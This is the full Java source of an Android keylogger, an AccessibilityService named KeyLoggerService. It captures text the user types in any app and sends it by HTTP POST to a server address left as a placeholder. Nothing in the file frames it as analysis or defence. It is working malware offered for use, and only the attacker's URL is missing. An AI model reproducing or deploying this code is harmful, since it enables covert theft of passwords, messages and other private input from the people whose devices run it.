package com.example.keylogger;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class KeyLoggerService extends AccessibilityService {
    private static final String SERVER_URL = "YOUR_SERVER_URL";

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            String text = event.getText().toString();
            sendToServer(text);
        }
    }

    @Override
    public void onInterrupt() {
        // Handle interruption
    }

    private void sendToServer(String text) {
        new Thread(() -> {
            try {
                URL url = new URL(SERVER_URL);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);

                OutputStream os = conn.getOutputStream();
                os.write(text.getBytes());
                os.flush();
                os.close();

                conn.getResponseCode(); // Send request
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }
}
